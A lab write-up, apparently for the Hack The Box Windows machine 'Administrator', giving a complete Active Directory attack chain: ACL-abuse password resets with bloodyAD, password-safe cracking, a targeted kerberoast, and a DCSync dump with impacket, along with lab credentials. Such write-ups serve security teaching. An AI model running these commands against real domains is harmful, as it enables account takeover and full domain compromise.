---
machine: Administrator
os: Windows                 # Linux | Windows | FreeBSD | Other
difficulty: Medium          # Easy | Medium | Hard | Insane
ip: 10.129.52.90
released: 2024-11-9                # YYYY-MM-DD
retired:  2025-04-19                # YYYY-MM-DD — REQUIRED to build. Must be past. "Expired" != "retired".
tags: [ad, kerberos]                  # [web, ad, kerberos, docker, suid]
status: ready             # draft | ready
---

<!--
  Fill this in as you go. Only this file is hand-written.
  Conventions the agent relies on:
    - ```cmd blocks with a caption line directly above become cheatsheet blocks
    - ![[evidence/foo.png]] embeds render as figures
    - "## Chain" lines of the form  Phase | Technique | Result  become the attack path table
    - Never paste flag values. Write [flag: user] / [flag: root].
-->

## Summary

One or two sentences. What the box actually teaches.

## Recon

Port scan, service enumeration, what stood out and why.

Initial full TCP scan
```cmd
nmap -p- -sCV $IP --min-rate 10000
```
```cmd
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst:
|_  SYST: Windows_NT
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-01 09:01:07Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Foun
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
50257/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
50262/tcp open  msrpc         Microsoft Windows RPC
50281/tcp open  msrpc         Microsoft Windows RPC
50284/tcp open  msrpc         Microsoft Windows RPC
58575/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-09-01T09:01:57
|_  start_date: N/A
|_clock-skew: 7h00m00s
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required

```


## Foothold

Provided with Credentials 
```
Olivia : ichliebedich
```
Extracted Bloodhound info

```cmd
bloodhound-python -d administrator.htb -u 'Olivia' -p 'ichliebedich' -ns 10.129.52.90 -c all --zip

```
Found ACL Abuse path from user "Olivia" to group "Share Moderators" in Bloodhound 
![[evidence/BloodHound Path.png]]

Executed Abuse Using BloodyAD
```cmd
bloodyAD -d administrator.htb --host 10.129.52.90 -u Olivia -p 'ichliebedich' set password Michael 'Password123!'

bloodyAD -d administrator.htb --host 10.129.52.90 -u Michael -p 'Password123!' set password Benjamin 'Password123!'

```

User "Benjamin" had Access to ftp, which held a "Backup.psafe3" file.

```cmd
ftp administrator.htb
```

![[evidence/Benjamin ftp.png]]

Used "pwsafe2john" and "john" to crack file
```cmd 
pwsafe2john Backup.psafe3 > psafe.hash

john psafe.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

returning password "tekieromucho"

Opening the psafe3 file Reveals 3 Credentials

![[evidence/Pwsafe.png]]

```
Alexander Smith alexander:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw

Emily Rodriguez emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb

Emma Johnson emma:WwANQWnmJnGV07WQN8bMS7FMAbjNur
```
User "emily"s Credentials Provide Win-RM capabilities

```cmd
evil-winrm -i administrator.htb -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
```
Providing User flag
```
244<REDACTED>
```
## Privilege Escalation

Using User "emily" GenericWrite Permissions over user "ethan" tester intiated a targeted kerberoast attack

![[evidence/Emily privs.png]]

```cmd
bloodyAD -d administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' --host 10.129.52.90 set object ethan servicePrincipalName -v 'HTTP/fake.ad.administrator.htb'

faketime "$DC_TIME" impacket-GetUserSPNs administrator.htb/emily:'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' -dc-ip 10.129.52.90 -request-user ethan -outputfile ethan.kerberoast
```
Using "Hashcat" password was decrypted to "limpbizkit"

```cmd
hashcat -m 13100 ethan.kerberoast rockyou.txt
```

User "ethan" can DCSync, compromising the domain

![[evidence/Ethan Privs.png]]

```cmd
impacket-secretsdump 'administrator.htb/ethan:limpbizkit@10.129.52.90' -just-dc
```

![[evidence/DCSync.png]]


Admin Hash "3dc5..."

Allowing Win-RM

Providing Root flag 
```
fa1<REDACTED>
```
